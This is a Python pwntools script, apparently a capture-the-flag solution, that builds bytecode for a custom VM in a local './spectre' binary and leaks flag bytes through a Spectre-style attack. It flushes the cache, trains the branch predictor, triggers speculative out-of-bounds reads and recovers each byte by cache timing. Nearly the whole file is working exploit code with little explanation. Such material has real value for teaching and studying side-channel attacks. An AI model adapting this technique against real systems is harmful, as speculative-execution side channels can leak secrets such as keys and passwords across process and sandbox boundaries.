from pwn import *

def enc_epilogue():
    opcode = ''
    opcode += '\x00'
    return opcode

def _tworeg_op(rn1, rn2, op):
    assert(rn1 in range(8) and rn2 in range(8))
    opcode = ''
    opcode += chr(op)
    opcode += chr(rn1 | (rn2 << 3))
    return opcode

def enc_cdq(rn1, rn2):
    return _tworeg_op(rn1, rn2, 1)

def enc_add(rn1, rn2):
    return _tworeg_op(rn1, rn2, 2)

def enc_sub(rn1, rn2):
    return _tworeg_op(rn1, rn2, 3)

def enc_and(rn1, rn2):
    return _tworeg_op(rn1, rn2, 4)

def enc_shl(rn1, rn2):
    return _tworeg_op(rn1, rn2, 5)

def enc_shr(rn1, rn2):
    return _tworeg_op(rn1, rn2, 6)

def enc_move(rn1, rn2):
    return _tworeg_op(rn1, rn2, 7)

def enc_movec(rn, imm32):
    assert(rn in range(8))
    opcode = ''
    opcode += '\x08'
    opcode += chr(rn) + p32(imm32)
    return opcode

def enc_load(rn1_reg, rn2_addr):
    return _tworeg_op(rn1_reg, rn2_addr, 9)

def enc_store(rn1_addr, rn2_reg):
    return _tworeg_op(rn1_addr, rn2_reg, 10)

def enc_builtin(rn_ret, fn):
    assert(fn == 0 or fn == 1)
    return _tworeg_op(rn_ret, fn, 11)

def enc_loop(rn, imm32_lim, imm32_goto):
    assert(rn in range(8))
    opcode = ''
    opcode += '\x0c'
    opcode += chr(rn << 3) + p32(imm32_lim) + p32(imm32_goto)
    return opcode

"""
usable memory:
[0x414100000000, 0x414100001000): data section
(unused)
[0x414100100000, 0x414100200000): (0x100 + [0, 0xff])*0x1000 branch misprediction cache
(unused)
[0x414100300000, 0x414102000000): cache-flushing memory [0x300, 0x2000) * 0x1000

exploit plan:
clear data section to 0
for i in range(0x1000):
    flush cache
    for j in range(0x100):
        train (with 0) + attack (7:1)
    for j in range(0x100):  # mixed-up order to prevent stride prediction
        measure time
        access
        measure time
        increment if cache hit
"""

FLAG_IDX = 0x1018 + 14
CACHE_HIT_THRESHOLD = 25
CACHE_FLUSH_COUNT = 0x2000
CACHE_FLUSH_REPEAT = 0x10
TRIAL_COUNT = 0x800

p = ''

## clear data section to 0
p += enc_movec(4, 1)  # reg4 = 1
p += enc_movec(3, 0)  # reg3 = 0
p += enc_movec(2, 3)  # reg2 = 3
p += enc_movec(0, 0)   # reg0 as iterator
jmp_dsinit = len(p)
p += enc_move(1, 0)  # reg1 = reg0
p += enc_shl(1, 2)  # reg1 <<= reg2
p += enc_store(1, 3)
p += enc_add(0, 4)
p += enc_loop(0, (0x1000 / 0x8) - 1, jmp_dsinit)

## TRIAL_COUNT trial
p += enc_movec(7, 0)  # reg7 = 0 == iterator of range(TRIAL_COUNT) ------------------- INUSE
jmp_trial = len(p)

### flush cache
p += enc_movec(5, 0)  # reg5 = 0
jmp_flcache_rep = len(p)
p += enc_movec(4, 1)  # reg4 = 1
p += enc_movec(3, 0)  # reg3 = 0
p += enc_movec(2, 12)  # reg2 = 12
p += enc_movec(0, 0x300)   # reg0 as iterator of [0x300, 0x2000)
jmp_flcache = len(p)
p += enc_move(1, 0)  # reg1 = reg0
p += enc_shl(1, 2)  # reg1 <<= reg2
p += enc_store(1, 3)
p += enc_add(1, 2)
p += enc_store(1, 3)
p += enc_sub(1, 4)
p += enc_store(1, 3)
p += enc_add(0, 4)
p += enc_loop(0, CACHE_FLUSH_COUNT - 1, jmp_flcache)
p += enc_add(5, 4)
p += enc_loop(5, CACHE_FLUSH_REPEAT - 1, jmp_flcache_rep)

### 0x100 runs of train (with 0) + attack (7:1) => let's just repeat this manually
p += enc_movec(6, 0)  # reg6 = 0 == iterator of range(0x10)
jmp_tarun = len(p)

for i in range(7):
    #### flush cache
    p += enc_movec(4, 1)  # reg4 = 1
    p += enc_movec(3, 0)  # reg3 = 0
    p += enc_movec(2, 12)  # reg2 = 12
    p += enc_movec(0, 0x300)   # reg0 as iterator of [0x300, 0x2000)
    jmp_flcache = len(p)
    p += enc_move(1, 0)  # reg1 = reg0
    p += enc_shl(1, 2)  # reg1 <<= reg2
    p += enc_store(1, 3)
    p += enc_add(1, 2)
    p += enc_store(1, 3)
    p += enc_sub(1, 4)
    p += enc_store(1, 3)
    p += enc_add(0, 4)
    p += enc_loop(0, CACHE_FLUSH_COUNT / 4 - 1, jmp_flcache)
    
    p += enc_movec(3, 0x100)  # reg3 = 0x100
    p += enc_movec(2, 12)  # reg2 = 12

    p += enc_move(4, 3)  # reg4 = reg3
    p += enc_movec(0, 0)  # reg0 = 0
    p += enc_builtin(0, 0)  # reg0 = builtin_bc(reg0)

#### flush cache
p += enc_movec(4, 1)  # reg4 = 1
p += enc_movec(3, 0)  # reg3 = 0
p += enc_movec(2, 12)  # reg2 = 12
p += enc_movec(0, 0x300)   # reg0 as iterator of [0x300, 0x2000)
jmp_flcache = len(p)
p += enc_move(1, 0)  # reg1 = reg0
p += enc_shl(1, 2)  # reg1 <<= reg2
p += enc_store(1, 3)
p += enc_add(1, 2)
p += enc_store(1, 3)
p += enc_sub(1, 4)
p += enc_store(1, 3)
p += enc_add(0, 4)
p += enc_loop(0, CACHE_FLUSH_COUNT / 4 - 1, jmp_flcache)

p += enc_movec(3, 0x100)  # reg3 = 0x100
p += enc_movec(2, 12)  # reg2 = 12

p += enc_move(4, 3)  # reg4 = reg3
p += enc_movec(0, FLAG_IDX)  # reg0 = FLAG_IDX
p += enc_builtin(0, 0)  # reg0 = builtin_bc(reg0) ===== Spectre in effect!
p += enc_add(4, 0)  # reg4 += reg0
p += enc_shl(4, 2)  # reg4 <<= reg2
p += enc_load(4, 4)  # reg4 = MEMORY[0x414100000000 + reg4] ===== Spectre finished!
p += (enc_add(4, 4) + enc_shl(4, 4)) * 0x40  # reg += reg4, reg4 <<= reg4
                        # (dummy ops, allow CPU to recognize misprediction)

p += enc_movec(5, 1)  # reg5 = 1
p += enc_add(6, 5)
p += enc_loop(6, 0x10 - 1, jmp_tarun)

### 0x100 cache time measurement & addition (mixed order)
p += enc_movec(6, 0)  # reg6 = 0 == iterator of range(0x100) ------------- INUSE
jmp_ctop = len(p)
p += enc_move(5, 6)  # reg5 = reg6 == char under search
p += enc_move(4, 5)  # reg4 = reg5
p += enc_add(5, 4) * (167 - 1)  # repeat reg5 += reg4 166 times
p += enc_movec(4, 13)  # reg4 = 13
p += enc_add(5, 4)  # reg5 += 13
p += enc_movec(4, 0xff)  # reg4 = 0xff
p += enc_and(5, 4)  # reg5 &= reg4
p += enc_movec(4, 0x100)  # reg4 = 0x100 == cache address
p += enc_add(4, 5)  # reg4 += reg5
p += enc_movec(3, 12)  # reg3 = 12
p += enc_shl(4, 3)  # reg4 <<= reg3
p += enc_builtin(3, 1)  # reg3 = builtin_time() 
p += enc_load(4, 4)  # reg4 = MEMORY[0x414100000000 + reg4]
p += enc_builtin(4, 1)  # reg4 = builtin_time()
p += enc_sub(4, 3)  # reg4 -= reg3 == memory access time
p += enc_add(5, 5) * 3  # repeat reg5 += reg5 3 times

p += enc_movec(2, 1)  # reg2 = 1
jmp_cachehit = len(p)

p += enc_movec(1, 1)  # reg1 = 1
p += enc_sub(2, 1)  # reg2 -= reg1

p += enc_move(0, 4)  # reg0 = reg4

p += enc_move(1, 4)  # reg1 = reg4
p += enc_and(1, 2)  # reg1 &= reg2
p += enc_sub(0, 1)  # reg0 -= reg1
p += enc_movec(1, 1)  # reg1 = 1
p += enc_sub(0, 1)  # reg0 -= reg1
p += enc_shr(0, 1)  # reg0 >>= reg1

p += enc_load(3, 5)  # reg3 = MEMORY[0x414100000000 + reg5]
p += enc_add(3, 1)  # reg3 += reg1
p += enc_store(5, 3)  # MEMORY[0x414100000000 + reg5] = reg3
p += enc_loop(0, CACHE_HIT_THRESHOLD, jmp_cachehit)  # if cache hit, incr twice. else incr once


p += enc_movec(5, 1)  # reg5 = 1
p += enc_add(6, 5)  # reg6 += reg5
p += enc_loop(6, 0x100 - 1, jmp_ctop)

## jmp for trial repetition
p += enc_movec(5, 1)  # reg5 = 1
p += enc_add(7, 5)  # reg7 += reg5
p += enc_loop(7, TRIAL_COUNT - 1, jmp_trial)

# terminate
p += enc_epilogue()

print(hex(len(p)))

p = p64(len(p)) + p

with open('./payload.bin', 'wb') as f:
    f.write(p)

print('payload saved as ./payload.bin')

#context.log_level = 'debug'

pr = process(['./spectre', 'fakeflag'])
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] 
#gdb.attach(proc.pidof(pr)[0], gdbscript='handle SIGALRM ignore\n')

pr.send(p)
res = pr.recv(0x8 * 0x100)

pr.close()

res = res[8:]
timesum = []
for i in range(1, 0x100):
    timesum.append((u64(res[:8]) - TRIAL_COUNT, chr(i)))
    if chr(i) == 'T':
        print(timesum[-1][0])
    res = res[8:]
timesum.sort()
timesum = timesum[::-1]

print(timesum)